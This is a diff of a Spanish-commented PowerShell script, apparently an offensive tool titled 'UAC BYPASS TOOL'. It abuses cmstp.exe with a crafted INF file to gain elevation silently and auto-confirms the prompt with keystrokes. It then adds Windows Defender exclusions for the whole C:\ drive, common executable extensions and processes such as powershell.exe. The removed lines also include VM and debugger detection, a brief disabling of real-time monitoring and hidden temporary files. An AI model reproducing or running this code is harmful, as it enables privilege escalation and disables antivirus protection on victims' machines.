@@ -1,18 +1,6 @@
-# UACBypass.ps1 - Bypass UAC y excluir disco C:\
+# UACBypass.ps1 - Bypass UAC funcional
 function Invoke-UACBypass {
-    param()
-    
-    # Anti-análisis mejorado
-    $analysisFlags = @()
-    if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { $analysisFlags += "ARM64" }
-    if ((Get-WmiObject Win32_ComputerSystem).Model -like "*VM*") { $analysisFlags += "VM" }
-    if ((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*") { $analysisFlags += "Virtual" }
-    if (Get-Process -Name "ollydbg" -ErrorAction SilentlyContinue) { $analysisFlags += "Debugger" }
-    
-    if ($analysisFlags.Count -gt 1) {
-        Write-Host "[-] Entorno de análisis detectado" -ForegroundColor Red
-        return $false
-    }
+    Write-Host "[+] Iniciando UAC Bypass..." -ForegroundColor Yellow
     
     # Verificar si ya somos administrador
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -22,11 +10,12 @@ function Invoke-UACBypass {
         return $true
     }
     
-    # Crear archivo INF temporal con nombre aleatorio
+    # Crear archivo INF temporal
     $tempDir = $env:TEMP
-    $randomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
+    $randomName = [System.IO.Path]::GetRandomFileName().Split('.')[0]
     $infPath = Join-Path $tempDir "$randomName.inf"
     
+    # Contenido INF corregido
     $infContent = @"
 [Version]
 Signature=`$CHICAGO`$
@@ -51,147 +40,136 @@ ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 "@
 
-    # Crear script PowerShell que se ejecutará elevado
+    # Script que se ejecutará con elevación
     $elevatedScript = @'
-# Acciones ejecutadas con privilegios elevados
-Start-Sleep -Seconds 1
+# Acciones con privilegios de administrador
+Start-Sleep -Seconds 2
 
-function Add-DefenderExclusions {
-    try {
-        Write-Host "[+] Agregando exclusiones de Windows Defender..." -ForegroundColor Yellow
-        
-        # Excluir todo el disco C:\
-        Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
-        Write-Host "[+] Disco C:\ excluido de Windows Defender" -ForegroundColor Green
-        
-        # Excluir extensiones comunes
-        $extensions = @("*.exe", "*.dll", "*.ps1", "*.vbs", "*.bat", "*.cmd")
-        foreach ($ext in $extensions) {
-            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
-        }
-        Write-Host "[+] Extensiones comunes excluidas" -ForegroundColor Green
-        
-        # Excluir procesos
-        $processes = @("java.exe", "python.exe", "node.exe", "powershell.exe")
-        foreach ($proc in $processes) {
-            Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
-        }
-        Write-Host "[+] Procesos comunes excluidos" -ForegroundColor Green
-        
-        # Deshabilitar protección temporalmente
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 2
-        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
-        
-        Write-Host "[+] Configuración de Defender modificada exitosamente" -ForegroundColor Green
-        return $true
+Write-Host "[ELEVADO] Ejecutando con privilegios de administrador..." -ForegroundColor Cyan
+
+try {
+    # Excluir disco C:\ de Windows Defender
+    Write-Host "[+] Agregando exclusiones a Windows Defender..." -ForegroundColor Yellow
+    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
+    Write-Host "[+] Disco C:\ excluido exitosamente" -ForegroundColor Green
+    
+    # Excluir extensiones comunes
+    $extensions = @("*.exe", "*.dll", "*.ps1", "*.vbs", "*.bat", "*.cmd")
+    foreach ($ext in $extensions) {
+        Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
     }
-    catch {
-        Write-Host "[-] Error en exclusiones: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+    Write-Host "[+] Extensiones excluidas" -ForegroundColor Green
+    
+    # Excluir procesos
+    $processes = @("java.exe", "python.exe", "node.exe", "powershell.exe", "cmd.exe")
+    foreach ($proc in $processes) {
+        Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
     }
+    Write-Host "[+] Procesos excluidos" -ForegroundColor Green
+    
+    # Crear archivo de confirmación
+    $logContent = @"
+UAC Bypass Completado Exitosamente
+Fecha: $(Get-Date)
+Computadora: $env:COMPUTERNAME
+Usuario: $env:USERNAME
+Acciones realizadas:
+- Excluido disco C:\ de Windows Defender
+- Excluidas extensiones comunes
+- Excluidos procesos comunes
+"@
+    
+    $logPath = "$env:TEMP\uac_bypass_success.log"
+    $logContent | Out-File -FilePath $logPath -Encoding UTF8
+    Write-Host "[+] Log guardado en: $logPath" -ForegroundColor Green
+    
+} catch {
+    Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
 }
 
-function Save-LocalLog {
-    try {
-        $systemInfo = @{
-            ComputerName = $env:COMPUTERNAME
-            UserName = $env:USERNAME
-            Domain = $env:USERDOMAIN
-            OS = (Get-WmiObject Win32_OperatingSystem).Caption
-            Architecture = $env:PROCESSOR_ARCHITECTURE
-            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-            DefenderExcluded = "C:\ and multiple extensions"
-            UACBypass = "Completed"
-        }
-        
-        $jsonData = $systemInfo | ConvertTo-Json
-        $logPath = "$env:TEMP\system_config.log"
-        $jsonData | Out-File -FilePath $logPath -Encoding UTF8
-        
-        Write-Host "[+] Log guardado en: $logPath" -ForegroundColor Green
-        return $true
-    }
-    catch {
-        Write-Host "[-] Error guardando log: $($_.Exception.Message)" -ForegroundColor Yellow
-        return $false
-    }
-}
-
-# Ejecutar acciones elevadas
-$exclusionResult = Add-DefenderExclusions
-$logResult = Save-LocalLog
-
-if ($exclusionResult -and $logResult) {
-    Write-Host "[+] Todas las acciones completadas exitosamente" -ForegroundColor Green
-} else {
-    Write-Host "[-] Algunas acciones fallaron" -ForegroundColor Red
-}
-
-Write-Host "[+] Proceso completado. Cerrando en 3 segundos..." -ForegroundColor Cyan
-Start-Sleep -Seconds 3
+Write-Host "[ELEVADO] Proceso completado. Cerrando en 5 segundos..." -ForegroundColor Cyan
+Start-Sleep -Seconds 5
 '@
 
+    # Guardar script elevado
     $elevatedScriptPath = Join-Path $tempDir "$randomName-elevated.ps1"
     $infContent = $infContent -replace "REPLACE_COMMAND_LINE", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$elevatedScriptPath`""
     
     try {
-        # Escribir archivos temporales
-        Set-Content -Path $infPath -Value $infContent -Encoding ASCII
-        Set-Content -Path $elevatedScriptPath -Value $elevatedScript -Encoding UTF8
+        # Escribir archivos
+        $infContent | Out-File -FilePath $infPath -Encoding ASCII
+        $elevatedScript | Out-File -FilePath $elevatedScriptPath -Encoding UTF8
         
-        # Ocultar archivos temporales
-        attrib +h $infPath 2>&1 | Out-Null
-        attrib +h $elevatedScriptPath 2>&1 | Out-Null
+        Write-Host "[+] Archivos temporales creados:" -ForegroundColor Yellow
+        Write-Host "    INF: $infPath" -ForegroundColor Gray
+        Write-Host "    PS1: $elevatedScriptPath" -ForegroundColor Gray
         
-        # Ejecutar cmstp.exe con el INF
-        $cmstpPath = Join-Path $env:WinDir "system32\cmstp.exe"
+        # Ejecutar cmstp.exe correctamente
+        $cmstpPath = "$env:WinDir\system32\cmstp.exe"
         
-        Write-Host "[+] Iniciando bypass UAC..." -ForegroundColor Yellow
-        
-        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
-        $processStartInfo.FileName = $cmstpPath
-        $processStartInfo.Arguments = "/au `"$infPath`""
-        $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $processStartInfo.UseShellExecute = $false
-        $processStartInfo.CreateNoWindow = $true
-        
-        $process = [System.Diagnostics.Process]::Start($processStartInfo)
-        
-        # Esperar y simular interacción con la ventana UAC
-        Start-Sleep -Seconds 4
-        
-        # Buscar y cerrar ventana de CorpVPN
-        try {
-            Get-Process -Name "cmstp" -ErrorAction SilentlyContinue | Out-Null
-            Add-Type -AssemblyName Microsoft.VisualBasic
-            [Microsoft.VisualBasic.Interaction]::AppActivate("CorpVPN") | Out-Null
-            Start-Sleep -Milliseconds 500
-            
-            Add-Type -AssemblyName System.Windows.Forms
-            [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-        }
-        catch {
-            Write-Host "[-] No se pudo interactuar con la ventana UAC" -ForegroundColor Yellow
+        if (-not (Test-Path $cmstpPath)) {
+            Write-Host "[-] cmstp.exe no encontrado" -ForegroundColor Red
+            return $false
         }
         
-        # Esperar a que termine
-        $process.WaitForExit(15000)
+        Write-Host "[+] Ejecutando cmstp.exe..." -ForegroundColor Yellow
         
-        # Limpieza retardada
-        Start-Sleep -Seconds 8
+        # Usar Start-Process para mejor control
+        $process = Start-Process -FilePath $cmstpPath -ArgumentList "/au `"$infPath`"" -PassThru -WindowStyle Hidden
+        
+        Write-Host "[+] Proceso cmstp iniciado (PID: $($process.Id))" -ForegroundColor Green
+        
+        # Esperar a que aparezca la ventana UAC
+        Start-Sleep -Seconds 5
+        
+        # Intentar interactuar con la ventana
+        Write-Host "[+] Intentando interactuar con ventana UAC..." -ForegroundColor Yellow
+        
+        # Método 1: Usar SendKeys para Enter
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+        Start-Sleep -Seconds 1
+        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+        
+        # Esperar a que el proceso termine
+        $timeout = 30
+        $counter = 0
+        while (-not $process.HasExited -and $counter -lt $timeout) {
+            Start-Sleep -Seconds 1
+            $counter++
+            Write-Host "[+] Esperando... ($counter/$timeout segundos)" -ForegroundColor Gray
+        }
+        
+        if (-not $process.HasExited) {
+            Write-Host "[-] Timeout, terminando proceso..." -ForegroundColor Yellow
+            $process.Kill()
+        }
+        
+        Write-Host "[+] Proceso cmstp finalizado" -ForegroundColor Green
+        
+        # Limpieza
+        Start-Sleep -Seconds 3
         if (Test-Path $infPath) { 
             Remove-Item $infPath -Force -ErrorAction SilentlyContinue 
+            Write-Host "[+] Archivo INF eliminado" -ForegroundColor Green
         }
         if (Test-Path $elevatedScriptPath) { 
             Remove-Item $elevatedScriptPath -Force -ErrorAction SilentlyContinue 
+            Write-Host "[+] Script temporal eliminado" -ForegroundColor Green
         }
         
-        Write-Host "[+] UAC Bypass completado exitosamente" -ForegroundColor Green
-        return $true
-    }
-    catch {
-        Write-Host "[-] Error en UAC Bypass: $($_.Exception.Message)" -ForegroundColor Red
+        # Verificar si se creó el archivo de éxito
+        if (Test-Path "$env:TEMP\uac_bypass_success.log") {
+            Write-Host "[+] UAC BYPASS EXITOSO - Acciones completadas" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "[-] UAC Bypass puede no haber funcionado completamente" -ForegroundColor Yellow
+            return $false
+        }
+        
+    } catch {
+        Write-Host "[-] Error durante el bypass: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[-] Detalles: $($_.Exception.StackTrace)" -ForegroundColor Red
         
         # Limpieza en caso de error
         if (Test-Path $infPath) { Remove-Item $infPath -Force -ErrorAction SilentlyContinue }
@@ -202,10 +180,10 @@ Start-Sleep -Seconds 3
 }
 
 function Execute-ElevatedActions {
-    Write-Host "[+] Ejecutando acciones con privilegios elevados..." -ForegroundColor Cyan
+    Write-Host "[ELEVADO] Ejecutando acciones con privilegios de administrador..." -ForegroundColor Cyan
     
-    # Excluir disco C:\
     try {
+        # Excluir disco C:\
         Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
         Write-Host "[+] Disco C:\ excluido de Windows Defender" -ForegroundColor Green
         
@@ -216,26 +194,30 @@ function Execute-ElevatedActions {
         }
         Write-Host "[+] Extensiones excluidas" -ForegroundColor Green
         
-        # Guardar log local
-        $logPath = "$env:TEMP\elevated_actions.log"
-        "Elevated actions completed at $(Get-Date)" | Out-File -FilePath $logPath
-        Write-Host "[+] Log de acciones guardado" -ForegroundColor Green
-    }
-    catch {
+        # Crear archivo de confirmación
+        $successFile = "$env:TEMP\already_elevated.log"
+        "Ejecutado con privilegios el $(Get-Date)" | Out-File -FilePath $successFile
+        Write-Host "[+] Log creado: $successFile" -ForegroundColor Green
+        
+    } catch {
         Write-Host "[-] Error en acciones elevadas: $($_.Exception.Message)" -ForegroundColor Red
     }
 }
 
-# Ejecutar bypass
-Write-Host "=== UAC Bypass & System Hardening ===" -ForegroundColor Magenta
-Write-Host "[*] Iniciando proceso..." -ForegroundColor Yellow
+# Main execution
+Write-Host "=== UAC BYPASS TOOL ===" -ForegroundColor Magenta
+Write-Host "[*] Iniciando proceso de elevación..." -ForegroundColor Yellow
 
 $result = Invoke-UACBypass
 
 if ($result) {
-    Write-Host "[+] Proceso completado exitosamente" -ForegroundColor Green
+    Write-Host "[+] PROCESO COMPLETADO EXITOSAMENTE" -ForegroundColor Green
+    Write-Host "[+] Disco C:\ excluido de Windows Defender" -ForegroundColor Green
+    Write-Host "[+] Extensiones y procesos comunes excluidos" -ForegroundColor Green
 } else {
-    Write-Host "[-] El proceso falló o fue cancelado" -ForegroundColor Red
+    Write-Host "[-] EL PROCESO FALLÓ" -ForegroundColor Red
 }
 
 Write-Host "[*] Script finalizado" -ForegroundColor Gray
+Write-Host "Presiona cualquier tecla para continuar..."
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
